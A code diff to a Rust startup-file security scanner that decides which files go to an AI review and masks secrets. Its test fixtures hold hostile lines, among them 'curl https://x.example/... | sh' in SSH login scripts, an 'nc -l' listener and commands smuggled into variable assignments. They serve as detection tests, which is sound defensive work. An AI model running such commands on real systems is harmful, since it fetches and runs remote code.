@@ -34,9 +34,15 @@ pub const fn is_trusted(tier: Tier) -> bool {
 /// How an item is named to the user and the AI: absolute, with the home
 /// directory as `~`.
 pub fn label(item: &Item, home: Option<&str>) -> String {
-    match home.and_then(|home| item.path.strip_prefix(&format!("{home}/"))) {
+    shown_path(&item.path, home)
+}
+
+/// `path` (relative to the root) as it is shown: absolute, with the home
+/// directory as `~`.
+fn shown_path(path: &str, home: Option<&str>) -> String {
+    match home.and_then(|home| path.strip_prefix(&format!("{home}/"))) {
         Some(rest) => format!("~/{rest}"),
-        None => format!("/{}", item.path),
+        None => format!("/{path}"),
     }
 }
 
@@ -97,8 +103,11 @@ fn examine(
         }
         // Where a limit cut short what an item runs, the review of its
         // text is all that is left; without one, something went unchecked.
-        let reviewed_as_text = matches!(item.body, Body::Text(_)) && !is_local_only(item, home);
-        if !reviewed_as_text {
+        let reading = match &item.body {
+            Body::Text(text) => Some(reading(item, home, text)),
+            _ => None,
+        };
+        if reading != Some(Reading::Reviewed) {
             report.gaps.extend(
                 item.notes
                     .iter()
@@ -107,24 +116,39 @@ fn examine(
             );
         }
         match &item.body {
-            Body::Text(text) if is_local_only(item, home) => {
+            Body::Text(text) if reading == Some(Reading::Settings) => {
                 report.text_files_reviewed += 1;
                 local_checks(report, item, &label, text);
             }
             Body::Text(text) => {
-                let before = report.findings.len();
-                // Reviewed, and sent to the AI, without the values that
-                // look like secrets.
+                let before = (report.findings.len(), report.agent_input.len());
+                // Read, and where it is sent to the AI sent, without the
+                // values that look like secrets. What a path says of the
+                // file is asked of the file's own path, not of the name
+                // the item is listed under.
                 let text = without_secrets(text);
-                let gaps = report.gaps.len();
-                review::analyze_text(report, &label, &text, false);
-                if is_code(item, &text) {
-                    send_despite_its_path(report, gaps, &label, &text);
+                let file = shown_path(collect::file_of(item), home);
+                if reading == Some(Reading::Reviewed) {
+                    review::analyze_text(report, &file, &text, false);
+                    facts.push(fact(item, &label));
+                } else {
+                    review::analyze_text_locally(report, &file, &text);
+                }
+                if file != label {
+                    for finding in &mut report.findings[before.0..] {
+                        if finding.path == file {
+                            finding.path.clone_from(&label);
+                        }
+                    }
+                    for sent in &mut report.agent_input[before.1..] {
+                        if sent.path == file {
+                            sent.path.clone_from(&label);
+                        }
+                    }
                 }
                 // Every item is persistence already; naming another start-up
                 // file (`.bash_profile` sourcing `.bashrc`) is not news.
-                drop_rule(report, before, RuleId::PersistenceModification);
-                facts.push(fact(item, &label));
+                drop_rule(report, before.0, RuleId::PersistenceModification);
             }
             Body::Binary(format) => {
                 // One without a hash is never recorded as approved, so
@@ -213,39 +237,95 @@ fn is_local_only(item: &Item, home: Option<&str>) -> bool {
     }
 }
 
-/// Whether `item`, with content `text`, is code and not a file that only
-/// holds settings: the SSH server's login script, a file a live check
-/// found running, or a script (by its `#!` line) that a command names.
-/// Such a file is reviewed whatever its path looks like: a script in
-/// `~/.ssh` or one called `rotate-token.sh` is still what runs. A file a
-/// start-up file merely reads in (`source ~/.secrets`) has no such line as
-/// a rule, and stays withheld: that is where exported keys are kept.
-fn is_code(item: &Item, text: &str) -> bool {
-    commands::is_ssh_rc(collect::stands_for(item))
-        || item.category.is_live()
-        || (item.run_by.is_some()
-            && collect::configuration_of(item).is_none()
-            && text.starts_with("#!"))
+/// How the text of an item is read.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum Reading {
+    /// By the local rules and the AI review.
+    Reviewed,
+    /// Settings that hold tokens, hosts and names: by the rules for that
+    /// kind of file, here (see `is_local_only`).
+    Settings,
+    /// A file whose path marks it as holding secrets: by the local rules,
+    /// here. Nothing lifts this: not that something runs the file, not its
+    /// first line. What it starts is followed all the same.
+    Secrets,
+    /// A file a live check named that nothing says is a script: by the
+    /// local rules, here. The check goes by a process's arguments, and an
+    /// argument may as well be a data file.
+    Unsure,
 }
 
-/// Queues `text` for the AI review where it was withheld only for what its
-/// path looks like (see `rules::is_sensitive_path`): the gaps from `from`
-/// on are the ones this file's review added.
-fn send_despite_its_path(report: &mut Report, from: usize, label: &str, text: &str) {
-    let withheld = |gap: &Gap| matches!(gap, Gap::SensitiveWithheld(path) if path == label);
-    if !report.gaps[from..].iter().any(withheld) {
-        return;
+impl Reading {
+    /// What the item says of being kept from the AI.
+    const fn note(self) -> Option<&'static str> {
+        match self {
+            Self::Reviewed => None,
+            Self::Settings => Some(
+                "checked locally only and kept from the AI: settings that may hold tokens, hosts or names",
+            ),
+            Self::Secrets => Some(
+                "checked by the local rules only and kept from the AI: its path marks it as holding secrets",
+            ),
+            Self::Unsure => Some(
+                "checked by the local rules only and kept from the AI: nothing says it is a script",
+            ),
+        }
     }
-    let mut index = 0;
-    report.gaps.retain(|gap| {
-        let keep = index < from || !withheld(gap);
-        index += 1;
-        keep
-    });
-    report.agent_input.push(crate::agent::SourceFile {
-        path: label.to_string(),
-        content: text.to_string(),
-    });
+}
+
+/// File name endings of scripts.
+const SCRIPT_EXTENSIONS: &[&str] = &[
+    "sh", "bash", "zsh", "ksh", "dash", "fish", "py", "pl", "rb", "js", "mjs", "cjs", "ts", "lua",
+    "php", "tcl", "awk",
+];
+
+/// How the text of `item` is read (see `Reading`). What a path says is
+/// asked of the path the content was read from and of the name a link
+/// gives it (`~/.ssh/rc` kept in a dotfiles directory is still a file of
+/// `~/.ssh`), never of the name the item is listed under, which may carry
+/// what a live check saw (`…/.env:tcp-3001`).
+pub fn reading(item: &Item, home: Option<&str>, text: &str) -> Reading {
+    if is_local_only(item, home) {
+        return Reading::Settings;
+    }
+    let file = collect::file_of(item);
+    if [file, collect::stands_for(item)]
+        .iter()
+        .any(|path| crate::rules::is_sensitive_path(path))
+    {
+        return Reading::Secrets;
+    }
+    if item.category.is_live() {
+        let name = file.rsplit('/').next().unwrap_or(file);
+        let script = text.trim_start_matches('\u{feff}').starts_with("#!")
+            || SCRIPT_EXTENSIONS
+                .iter()
+                .any(|extension| crate::sweep::read::has_extension(name, extension));
+        if !script {
+            return Reading::Unsure;
+        }
+    }
+    Reading::Reviewed
+}
+
+/// Says on each item that is kept from the AI that it is, and why.
+pub fn note_kept(items: &mut [Item], home: Option<&str>) {
+    // An account, a key or a certificate authority is a fact with no text
+    // to send: nothing to say of those.
+    let fact = |item: &Item| matches!(item.category, Category::Account | Category::Trust);
+    for item in items
+        .iter_mut()
+        .filter(|item| !item.is_trusted() && !fact(item))
+    {
+        let Body::Text(text) = &item.body else {
+            continue;
+        };
+        if let Some(note) = reading(item, home, text).note()
+            && !item.notes.iter().any(|existing| existing == note)
+        {
+            item.notes.push(note.to_string());
+        }
+    }
 }
 
 fn drop_rule(report: &mut Report, from: usize, rule: RuleId) {
@@ -272,6 +352,9 @@ const SECRET_NAMES: &[&str] = &[
     "AUTH",
     "AUTHTOKEN",
     "PAT",
+    "PASS",
+    "PWD",
+    "PSK",
 ];
 
 /// Directories nothing lasting runs from.
@@ -395,7 +478,14 @@ fn redact_line(line: &str) -> Option<String> {
         out.push('=');
         out.push_str(padding);
         let closed = quote.is_none_or(|quote| after[1..].contains(quote));
-        if is_secret_name(name) && is_literal_secret(value) && closed {
+        // Inside quotes a literal may hold blanks and punctuation: what
+        // could make it code is an expansion, and that is asked for.
+        let literal = if quote.is_some() {
+            is_quoted_secret(value)
+        } else {
+            is_literal_secret(value)
+        };
+        if is_secret_name(name) && literal && closed {
             changed = true;
             if let Some(quote) = quote {
                 out.push(quote);
@@ -433,6 +523,17 @@ fn is_literal_secret(value: &str) -> bool {
         && value
             .chars()
             .all(|c| c.is_ascii_alphanumeric() || "_-./+=:@%,".contains(c))
+}
+
+/// Whether `value`, written between quotes, is a literal long enough to be
+/// a secret: whatever characters it holds (`p@ss w0rd!`), as long as none
+/// of them makes a shell expand or run something (`$`, a backtick, a
+/// backslash) and it does not say where something is (a path, a URL).
+fn is_quoted_secret(value: &str) -> bool {
+    value.len() >= 8
+        && !value.starts_with(['/', '~', '$', '-', '.'])
+        && !value.contains("://")
+        && !value.contains(['$', '`', '\\'])
 }
 
 fn local_checks(report: &mut Report, item: &Item, label: &str, text: &str) {
@@ -605,7 +706,7 @@ fn fact(item: &Item, label: &str) -> String {
 mod tests {
     use super::{fact, is_local_only, label, local_checks, located};
     use crate::autorun::Category;
-    use crate::report::Gap;
+    use crate::report::LocalFinding;
     use crate::report::Report;
     use crate::rules::RuleId;
     use std::collections::HashSet;
@@ -617,6 +718,7 @@ mod tests {
 
     fn item(path: &str, category: Category, tier: Tier) -> Item {
         Item {
+            file: None,
             origin: Origin::User,
             category,
             path: path.into(),
@@ -981,12 +1083,11 @@ mod tests {
                 "{label}: {findings:?}"
             );
         }
-        // Found running, a file is code: it is sent wherever it lies,
-        // `~/.ssh` included.
-        assert_eq!(
-            sent,
-            ["~/.ssh/config.d/extra", "~/bin/miner.sh", "~/work/hosts"]
-        );
+        // All three are read by the local rules. Sent is only the one
+        // that is credibly a script: a file under `~/.ssh` never is,
+        // whatever runs it, and a live check's file with no `#!` line and
+        // no script's name may as well be data.
+        assert_eq!(sent, ["~/bin/miner.sh"]);
     }
 
     #[test]
@@ -1032,10 +1133,10 @@ mod tests {
             assert!(is_local_only(item.unwrap(), home), "{path}");
         }
         let (sent, findings) = examined(&collection);
-        // The login script is code under whatever name it is kept: read by
-        // the rules and sent. The key's option is told as for the file
-        // unlinked.
-        assert_eq!(sent, ["~/dotfiles/sshrc"]);
+        // The login script is read by the pattern rules under whatever
+        // name it is kept, and like every file of `~/.ssh` not sent. The
+        // key's option is told as for the file unlinked.
+        assert!(sent.is_empty(), "{sent:?}");
         for found in [
             ("~/dotfiles/sshrc", RuleId::DownloadAndExecute),
             ("~/dotfiles/keys", RuleId::SshCommand),
@@ -1055,7 +1156,7 @@ mod tests {
     }
 
     #[test]
-    fn the_login_script_of_the_ssh_server_is_reviewed_as_the_script_it_is() {
+    fn the_login_script_and_scripts_under_a_secret_path_are_read_here_and_not_sent() {
         let dir = planted(
             "sweep-ssh-rc",
             &[
@@ -1068,7 +1169,7 @@ mod tests {
                     "#!/bin/sh\ncurl https://x.example/l | sh\n",
                 ),
                 ("home/u/.ssh/config", "Host internal\n  User secret-name\n"),
-                // A script under `~/.ssh` that a command names is code too.
+                // A script under `~/.ssh` that a command names.
                 (
                     "home/u/.ssh/hook.sh",
                     "#!/bin/sh\ncurl https://x.example/k | sh\n",
@@ -1077,10 +1178,19 @@ mod tests {
                     "home/u/.config/systemd/user/hook.service",
                     "[Service]\nExecStart=%h/.ssh/hook.sh\n",
                 ),
-                // What a start-up file merely reads in stays withheld by its
-                // name: that is where exported keys are kept.
-                ("home/u/.bashrc", ". ~/.ssh/env\n"),
+                // Files a start-up file reads in, with and without a `#!`
+                // line: where exported keys are kept.
+                (
+                    "home/u/.bashrc",
+                    ". ~/.ssh/env\nsource ~/.config/secrets/shebang-env.sh\n. ~/.env\n. ~/.config/shell/plain\n",
+                ),
                 ("home/u/.ssh/env", "export OTHER=abcdefgh12345678\n"),
+                (
+                    "home/u/.config/secrets/shebang-env.sh",
+                    "#!/bin/sh\nexport THING=abcdefgh12345678\n",
+                ),
+                ("home/u/.env", "#!/bin/sh\nexport THING=abcdefgh12345678\n"),
+                ("home/u/.config/shell/plain", "alias ll='ls -l'\n"),
                 ("etc/ssh/sshrc", "curl https://x.example/e | sh\n"),
             ],
             &[],
@@ -1093,26 +1203,52 @@ mod tests {
             index: &index,
             origin: Origin::System,
         };
-        let collection = collect::collect(&scope);
+        let mut collection = collect::collect(&scope);
+        super::note_kept(&mut collection.items, home);
         let rc = collection
             .items
             .iter()
             .find(|item| item.path == "home/u/.ssh/rc")
             .unwrap();
-        assert!(!is_local_only(rc, home));
-        // Looked through for what it starts, as a start-up file is.
+        // Looked through for what it starts, as a start-up file is, and
+        // says that it is kept from the AI.
         assert_eq!(rc.runs, ["~/bin/at-login.sh"]);
+        let kept = |note: &String| note.contains("kept from the AI");
+        assert!(rc.notes.iter().any(kept), "{:?}", rc.notes);
 
         let mut report = Report::new("t");
         super::examine(&mut report, &collection, home, &HashSet::new());
-        let sent = |path: &str| report.agent_input.iter().find(|file| file.path == path);
+        let sent: Vec<&str> = report
+            .agent_input
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        // What goes: the script the login script starts, the system's own
+        // login script, the unit, and the start-up file with the file it
+        // reads in whose path says nothing.
+        assert_eq!(
+            sent,
+            [
+                "/etc/ssh/sshrc",
+                "~/.bashrc",
+                "~/.config/shell/plain",
+                "~/.config/systemd/user/hook.service",
+                "~/bin/at-login.sh"
+            ]
+        );
+        assert!(
+            !report
+                .agent_input
+                .iter()
+                .any(|file| file.content.contains("abcdefgh12345678"))
+        );
+        // What stays is read by the pattern rules all the same.
         for script in [
             "~/.ssh/rc",
-            "~/bin/at-login.sh",
             "~/.ssh/hook.sh",
+            "~/bin/at-login.sh",
             "/etc/ssh/sshrc",
         ] {
-            assert!(sent(script).is_some(), "{script} was not queued");
             assert!(
                 report
                     .findings
@@ -1123,30 +1259,92 @@ mod tests {
                 report.findings
             );
         }
-        // With the masking every reviewed text gets.
-        assert!(
-            !sent("~/.ssh/rc")
-                .unwrap()
-                .content
-                .contains("abcdefgh12345678")
+        // Being there is no finding, and being kept makes no sweep
+        // incomplete.
+        let there = |finding: &LocalFinding| finding.rule == RuleId::SshCommand;
+        assert!(!report.findings.iter().any(there));
+        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
+    }
+
+    #[test]
+    fn a_file_a_live_check_names_is_sent_only_where_it_is_a_script_and_no_secret() {
+        let secret = "hunter2-live-secret";
+        let files: Vec<(String, String)> = [
+            "home/u/proj/secrets/prod.env",
+            "home/u/.aws/credentials",
+            "home/u/.ssh/id_ed25519",
+            "home/u/proj/.env",
+            "home/u/proj/key.pem",
+            "home/u/proj/id_ed25519",
+            "home/u/.netrc",
+            // No secret by its path, and nothing says it is a script.
+            "home/u/proj/data.txt",
+        ]
+        .iter()
+        .map(|path| ((*path).to_string(), format!("PASSWORD_LINE {secret}\n")))
+        .chain([
+            (
+                "home/u/proj/app.py".to_string(),
+                "print('listening')\n".to_string(),
+            ),
+            (
+                "home/u/proj/run".to_string(),
+                "#!/bin/sh\nexec nc -l 9\n".to_string(),
+            ),
+        ])
+        .collect();
+        let planted_files: Vec<(&str, &str)> = files
+            .iter()
+            .map(|(path, text)| (path.as_str(), text.as_str()))
+            .collect();
+        let dir = planted("sweep-live-secrets", &planted_files, &[]);
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root: dir.path(),
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let mut collection = collect::collect(&scope);
+        // As the live checks list them: under the path and what was seen.
+        let mut live = Vec::new();
+        for (path, _) in &files {
+            for suffix in ["tcp-3001", "to-203.0.113.5", "http.server:cwd-0123456789ab"] {
+                let name = format!("{path}:{suffix}");
+                live.push(collect::item_named(&scope, Category::Listener, &name, path));
+            }
+            live.push(collect::item_named(&scope, Category::Process, path, path));
+        }
+        collect::merge(&mut collection, live);
+        let mut report = Report::new("t");
+        super::examine(&mut report, &collection, home, &HashSet::new());
+        let mut sent: Vec<&str> = report
+            .agent_input
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        sent.sort_unstable();
+        assert_eq!(
+            sent,
+            [
+                "~/proj/app.py",
+                "~/proj/app.py:http.server:cwd-0123456789ab",
+                "~/proj/app.py:tcp-3001",
+                "~/proj/app.py:to-203.0.113.5",
+                "~/proj/run",
+                "~/proj/run:http.server:cwd-0123456789ab",
+                "~/proj/run:tcp-3001",
+                "~/proj/run:to-203.0.113.5",
+            ]
         );
-        // Its being there is no finding by itself any more.
         assert!(
             !report
-                .findings
+                .agent_input
                 .iter()
-                .any(|finding| finding.rule == RuleId::SshCommand)
+                .any(|file| file.content.contains(secret))
         );
-        // Every other file under `~/.ssh` stays where it is.
-        for kept in ["~/.ssh/config", "~/.ssh/env"] {
-            assert!(sent(kept).is_none(), "{kept} was queued");
-        }
-        assert!(
-            report
-                .gaps
-                .iter()
-                .any(|gap| matches!(gap, Gap::SensitiveWithheld(path) if path == "~/.ssh/env"))
-        );
+        assert!(report.gaps.is_empty(), "{:?}", report.gaps);
     }
 
     #[test]
@@ -1290,6 +1488,42 @@ mod tests {
         let lines: Vec<usize> = report.findings.iter().map(|finding| finding.line).collect();
         assert_eq!(lines, [1]);
         assert!(!report.findings[0].excerpt.contains("AAAA"));
+    }
+
+    #[test]
+    fn a_quoted_literal_and_more_names_are_taken_out_and_code_never_is() {
+        use super::without_secrets;
+        // A quoted literal may hold blanks and punctuation.
+        for line in [
+            "SESSION_SECRET='p@ss w0rd!'\n",
+            "export SESSION_SECRET=\"p@ss w0rd!\"\n",
+            "DB_PASS=hunter2hunter2\n",
+            "WIFI_PSK='correct horse battery'\n",
+            "SMTP_PWD=hunter2hunter2\n",
+        ] {
+            let masked = without_secrets(line);
+            assert!(
+                masked.contains(super::REDACTED)
+                    && !masked.contains("w0rd")
+                    && !masked.contains("hunter2")
+                    && !masked.contains("horse"),
+                "{masked}"
+            );
+        }
+        // What could be code, or says where something is, stays to be read:
+        // an expansion inside the quotes, a command after the assignment,
+        // a short value, a path, a URL.
+        for line in [
+            "SESSION_SECRET=\"$(curl https://x.example/s)\"\n",
+            "SESSION_SECRET='a`id`bcdefgh'\n",
+            "SESSION_SECRET=\"abcd\\$efgh\"\n",
+            "PASS=1 curl https://x.example/p | sh\n",
+            "OLDPWD=/home/u/work\n",
+            "PWD='/srv/some where'\n",
+            "DB_PASS='https://x.example/get pass'\n",
+        ] {
+            assert_eq!(without_secrets(line), line);
+        }
     }
 
     #[test]
